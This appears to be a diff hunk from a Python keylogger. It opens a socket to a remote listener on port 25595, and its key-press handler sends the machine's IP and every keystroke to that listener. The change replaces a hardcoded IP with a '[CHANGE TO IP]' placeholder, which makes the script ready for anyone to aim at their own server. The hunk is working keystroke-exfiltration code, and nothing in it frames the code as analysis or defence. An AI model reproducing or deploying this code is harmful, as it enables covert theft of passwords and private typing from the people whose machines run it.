@@ -6,7 +6,7 @@ hostname = socket.gethostname()
 ip = socket.gethostbyname(hostname)
 
 s = socket.socket()
-s.connect(("192.168.178.112", 25595))
+s.connect(("[CHANGE TO IP]", 25595))
 
 def on_press(key):
     s.send(f"{ip} {key}".encode())
